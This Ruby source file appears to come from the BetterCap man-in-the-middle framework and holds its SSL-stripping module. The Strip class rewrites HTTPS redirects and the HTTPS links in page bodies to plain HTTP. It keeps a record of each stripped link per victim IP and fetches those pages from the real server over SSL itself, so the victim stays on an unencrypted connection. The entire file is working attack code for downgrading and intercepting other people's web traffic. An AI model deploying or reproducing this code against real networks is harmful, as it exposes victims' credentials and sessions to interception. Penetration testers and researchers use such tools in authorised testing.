=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

module BetterCap
module Proxy
module SSLStrip

# Handle SSL stripping.
class Strip
  # Maximum number of redirects to detect a HTTPS redirect loop.
  MAX_REDIRECTS = 3

  # Create an instance of this object.
  def initialize
    @urlmonitor = URLMonitor.new
  end

  # Process the +request+ and if it's a redirect to a HTTPS url patch the
  # Location header and retry.
  # Process the +response+ and replace every https link in its body with
  # http counterparts.
  def process( client_ip, request, response )
    # check for a redirect
    if response['Location'].include?('https://')
      link = if response['Location'].end_with?('/') then response['Location'] else "#{response['Location']}/" end
      Logger.info "[#{'SSLSTRIP'.green} #{client_ip}] Found redirect to HTTPS '#{link}'."
      @urlmonitor.add!( client_ip, link )

      # if MAX_REDIRECTS is reached, the 'Location' header will be used, otherwise
      # the request will be retried on port 443.
      response['Location'] = response['Location'].gsub( 'https://', 'http://' )
      request.port = 443
      # retry the request if possible
      return true
    end

    # parse body
    response.body.scan( /(https:\/\/[^"'\/]+)/i ).uniq.each do |link|
      link = "#{link[0]}/"
      if link.include?('.')
        Logger.info "[#{'SSLSTRIP'.green} #{client_ip}] Found HTTPS link '#{link}'."
        @urlmonitor.add!( client_ip, link )
        response.body.gsub!( link, link.gsub( 'https://', 'http://' ) )
      end
    end

    # do not retry the request.
    false
  end

  # Check if the +request+ coming from +client_ip+ is a result of a stripped
  # link/redirect.
  def check( client_ip, request )
    if request.port == 80 and @urlmonitor.secure_link?( client_ip, "https://#{request.host}/" )
      Logger.debug "[#{'SSLSTRIP'.green} #{client_ip}] Found stripped HTTPS link 'https://#{request.host}', proxying via SSL."
      request.port = 443
    end
  end
end

end
end
end
